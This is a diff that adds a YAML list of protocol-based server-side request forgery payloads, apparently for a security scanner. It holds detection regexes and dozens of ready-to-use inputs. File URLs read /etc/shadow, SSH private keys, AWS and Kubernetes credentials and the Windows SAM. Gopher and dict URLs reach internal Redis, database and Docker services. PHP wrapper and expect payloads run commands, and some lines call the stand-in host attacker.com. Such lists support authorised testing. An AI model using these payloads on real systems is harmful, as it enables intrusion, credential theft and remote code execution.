@@ -1,0 +1,424 @@
+metadata:
+  type: ssrf/protocol
+  version: "1.0"
+  description: "Protocol-based SSRF payloads"
+  sources: ["OWASP", "PayloadsAllTheThings", "HackTricks"]
+
+detection_patterns:
+  - "(?i)root:.*?:0:0:"
+  - "(?i)file not found"
+  - "(?i)connection refused"
+  - "(?i)no route to host"
+
+payloads:
+  file:
+    - value: "file:///etc/passwd"
+      description: "Read /etc/passwd"
+      severity: critical
+      tags: [file, linux]
+
+    - value: "file:///etc/shadow"
+      description: "Read /etc/shadow"
+      severity: critical
+      tags: [file, linux]
+
+    - value: "file:///etc/hosts"
+      description: "Read /etc/hosts"
+      severity: high
+      tags: [file, linux]
+
+    - value: "file:///etc/hostname"
+      description: "Read hostname"
+      severity: high
+      tags: [file, linux]
+
+    - value: "file:///etc/issue"
+      description: "Read OS version"
+      severity: high
+      tags: [file, linux]
+
+    - value: "file:///etc/group"
+      description: "Read group file"
+      severity: high
+      tags: [file, linux]
+
+    - value: "file:///proc/self/environ"
+      description: "Read process environment"
+      severity: critical
+      tags: [file, linux, env]
+
+    - value: "file:///proc/self/cmdline"
+      description: "Read process cmdline"
+      severity: high
+      tags: [file, linux]
+
+    - value: "file:///proc/version"
+      description: "Read kernel version"
+      severity: high
+      tags: [file, linux]
+
+    - value: "file:///proc/net/tcp"
+      description: "Read TCP connections"
+      severity: high
+      tags: [file, linux, network]
+
+    - value: "file:///proc/net/arp"
+      description: "Read ARP table"
+      severity: high
+      tags: [file, linux, network]
+
+    - value: "file:///proc/mounts"
+      description: "Read mounted filesystems"
+      severity: high
+      tags: [file, linux]
+
+    - value: "file:///proc/self/status"
+      description: "Read process status"
+      severity: medium
+      tags: [file, linux]
+
+    - value: "file:///proc/self/fd/0"
+      description: "Read file descriptor 0"
+      severity: medium
+      tags: [file, linux]
+
+    - value: "file:///c:/windows/system32/drivers/etc/hosts"
+      description: "Windows hosts file"
+      severity: high
+      tags: [file, windows]
+
+    - value: "file:///c:/windows/system32/drivers/etc/hostname"
+      description: "Windows hostname"
+      severity: high
+      tags: [file, windows]
+
+    - value: "file:///c:/windows/win.ini"
+      description: "Windows win.ini"
+      severity: high
+      tags: [file, windows]
+
+    - value: "file:///c:/boot.ini"
+      description: "Windows boot.ini"
+      severity: high
+      tags: [file, windows]
+
+    - value: "file:///c:/windows/system32/config/sam"
+      description: "Windows SAM file"
+      severity: critical
+      tags: [file, windows]
+
+    - value: "file:///c:/windows/repair/sam"
+      description: "Windows backup SAM"
+      severity: critical
+      tags: [file, windows]
+
+    - value: "file:///c:/windows/system32/config/system"
+      description: "Windows system config"
+      severity: critical
+      tags: [file, windows]
+
+    - value: "file:///etc/httpd/conf/httpd.conf"
+      description: "Apache config"
+      severity: high
+      tags: [file, linux, config]
+
+    - value: "file:///etc/nginx/nginx.conf"
+      description: "Nginx config"
+      severity: high
+      tags: [file, linux, config]
+
+    - value: "file:///var/log/apache2/access.log"
+      description: "Apache access log"
+      severity: high
+      tags: [file, linux, log]
+
+    - value: "file:///var/log/nginx/access.log"
+      description: "Nginx access log"
+      severity: high
+      tags: [file, linux, log]
+
+    - value: "file:///var/log/auth.log"
+      description: "Auth log"
+      severity: high
+      tags: [file, linux, log]
+
+    - value: "file:///var/log/syslog"
+      description: "System log"
+      severity: high
+      tags: [file, linux, log]
+
+    - value: "file:///home/user/.ssh/id_rsa"
+      description: "SSH private key"
+      severity: critical
+      tags: [file, linux, ssh]
+
+    - value: "file:///home/user/.bash_history"
+      description: "Bash history"
+      severity: high
+      tags: [file, linux, history]
+
+    - value: "file:///root/.bash_history"
+      description: "Root bash history"
+      severity: high
+      tags: [file, linux, history]
+
+    - value: "file:///var/www/html/.env"
+      description: "Web app .env file"
+      severity: critical
+      tags: [file, linux, config]
+
+    - value: "file:///var/www/html/wp-config.php"
+      description: "WordPress config"
+      severity: critical
+      tags: [file, linux, config]
+
+    - value: "file:///etc/mysql/my.cnf"
+      description: "MySQL config"
+      severity: high
+      tags: [file, linux, config]
+
+    - value: "file:///etc/redis/redis.conf"
+      description: "Redis config"
+      severity: high
+      tags: [file, linux, config]
+
+    - value: "file:///root/.aws/credentials"
+      description: "AWS credentials"
+      severity: critical
+      tags: [file, linux, cloud]
+
+    - value: "file:///root/.kube/config"
+      description: "Kubernetes config"
+      severity: critical
+      tags: [file, linux, cloud]
+
+  gopher:
+    - value: "gopher://127.0.0.1:25/"
+      description: "SMTP via gopher"
+      severity: high
+      tags: [gopher, smtp]
+
+    - value: "gopher://127.0.0.1:6379/"
+      description: "Redis via gopher"
+      severity: critical
+      tags: [gopher, redis]
+
+    - value: "gopher://127.0.0.1:3306/"
+      description: "MySQL via gopher"
+      severity: critical
+      tags: [gopher, mysql]
+
+    - value: "gopher://127.0.0.1:5432/"
+      description: "PostgreSQL via gopher"
+      severity: critical
+      tags: [gopher, postgresql]
+
+    - value: "gopher://127.0.0.1:27017/"
+      description: "MongoDB via gopher"
+      severity: critical
+      tags: [gopher, mongodb]
+
+    - value: "gopher://127.0.0.1:11211/"
+      description: "Memcached via gopher"
+      severity: high
+      tags: [gopher, memcached]
+
+    - value: "gopher://127.0.0.1:80/"
+      description: "HTTP via gopher"
+      severity: high
+      tags: [gopher, http]
+
+    - value: "gopher://127.0.0.1:9200/"
+      description: "Elasticsearch via gopher"
+      severity: high
+      tags: [gopher, elasticsearch]
+
+    - value: "gopher://127.0.0.1:2375/"
+      description: "Docker API via gopher"
+      severity: critical
+      tags: [gopher, docker]
+
+    - value: "gopher://127.0.0.1:8500/"
+      description: "Consul via gopher"
+      severity: high
+      tags: [gopher, consul]
+
+  dict:
+    - value: "dict://127.0.0.1:6379/INFO"
+      description: "Redis INFO via dict"
+      severity: critical
+      tags: [dict, redis]
+
+    - value: "dict://127.0.0.1:6379/CONFIG/GET/databases"
+      description: "Redis CONFIG GET via dict"
+      severity: critical
+      tags: [dict, redis]
+
+    - value: "dict://127.0.0.1:11211/stats"
+      description: "Memcached stats via dict"
+      severity: high
+      tags: [dict, memcached]
+
+    - value: "dict://127.0.0.1:25/"
+      description: "SMTP via dict"
+      severity: high
+      tags: [dict, smtp]
+
+  ldap:
+    - value: "ldap://127.0.0.1:389/"
+      description: "LDAP via SSRF"
+      severity: high
+      tags: [ldap]
+
+    - value: "ldap://127.0.0.1:389/dc=example,dc=com"
+      description: "LDAP search"
+      severity: high
+      tags: [ldap]
+
+    - value: "ldaps://127.0.0.1:636/"
+      description: "LDAPS via SSRF"
+      severity: high
+      tags: [ldap]
+
+    - value: "ldap://127.0.0.1:389/cn=admin,dc=example,dc=com"
+      description: "LDAP admin DN"
+      severity: high
+      tags: [ldap]
+
+  tftp:
+    - value: "tftp://127.0.0.1:69/etc/passwd"
+      description: "TFTP file read"
+      severity: high
+      tags: [tftp]
+
+    - value: "tftp://attacker.com/file"
+      description: "TFTP external"
+      severity: high
+      tags: [tftp]
+
+  other_protocols:
+    - value: "jar:http://attacker.com/file.jar!/"
+      description: "JAR protocol"
+      severity: high
+      tags: [jar]
+
+    - value: "jar:http://attacker.com/file.jar!/META-INF/MANIFEST.MF"
+      description: "JAR manifest read"
+      severity: high
+      tags: [jar]
+
+    - value: "netdoc:///etc/passwd"
+      description: "Netdoc protocol"
+      severity: high
+      tags: [netdoc]
+
+    - value: "expect://id"
+      description: "Expect protocol RCE"
+      severity: critical
+      tags: [expect, rce]
+
+    - value: "expect://whoami"
+      description: "Expect whoami"
+      severity: critical
+      tags: [expect, rce]
+
+    - value: "ssh://127.0.0.1/"
+      description: "SSH protocol"
+      severity: high
+      tags: [ssh]
+
+    - value: "sftp://127.0.0.1/"
+      description: "SFTP protocol"
+      severity: high
+      tags: [sftp]
+
+    - value: "ftp://127.0.0.1/"
+      description: "FTP protocol"
+      severity: high
+      tags: [ftp]
+
+    - value: "ftp://attacker.com/"
+      description: "FTP external"
+      severity: high
+      tags: [ftp]
+
+    - value: "smtp://127.0.0.1:25/"
+      description: "SMTP protocol"
+      severity: high
+      tags: [smtp]
+
+  php_wrappers:
+    - value: "php://filter/convert.base64-encode/resource=/etc/passwd"
+      description: "PHP filter base64"
+      severity: critical
+      tags: [php, filter]
+
+    - value: "php://filter/convert.base64-encode/resource=index.php"
+      description: "PHP filter read source"
+      severity: critical
+      tags: [php, filter]
+
+    - value: "php://filter/convert.base64-encode/resource=config.php"
+      description: "PHP filter config"
+      severity: critical
+      tags: [php, filter]
+
+    - value: "php://filter/convert.base64-encode/resource=../wp-config.php"
+      description: "PHP filter WordPress config"
+      severity: critical
+      tags: [php, filter]
+
+    - value: "php://input"
+      description: "PHP input stream"
+      severity: high
+      tags: [php, input]
+
+    - value: "php://stdin"
+      description: "PHP stdin"
+      severity: medium
+      tags: [php, stdin]
+
+    - value: "data://text/plain;base64,SSBsb3ZlIFBIUAo="
+      description: "PHP data wrapper base64"
+      severity: high
+      tags: [php, data]
+
+    - value: "data://text/plain,<?php phpinfo()?>"
+      description: "PHP data wrapper code"
+      severity: high
+      tags: [php, data, rce]
+
+    - value: "data://text/plain,<?php system('id')?>"
+      description: "PHP data wrapper RCE"
+      severity: critical
+      tags: [php, data, rce]
+
+    - value: "phar://file.phar/test.txt"
+      description: "PHP phar wrapper"
+      severity: high
+      tags: [php, phar]
+
+    - value: "compress.zlib:///etc/passwd"
+      description: "PHP compress.zlib"
+      severity: high
+      tags: [php, compress]
+
+    - value: "compress.bzip2:///etc/passwd"
+      description: "PHP compress.bzip2"
+      severity: high
+      tags: [php, compress]
+
+    - value: "zip://file.zip#file.txt"
+      description: "PHP zip wrapper"
+      severity: high
+      tags: [php, zip]
+
+    - value: "glob:///*.php"
+      description: "PHP glob wrapper"
+      severity: medium
+      tags: [php, glob]
+
+    - value: "ogg:///etc/passwd"
+      description: "PHP ogg wrapper"
+      severity: high
+      tags: [php, ogg]
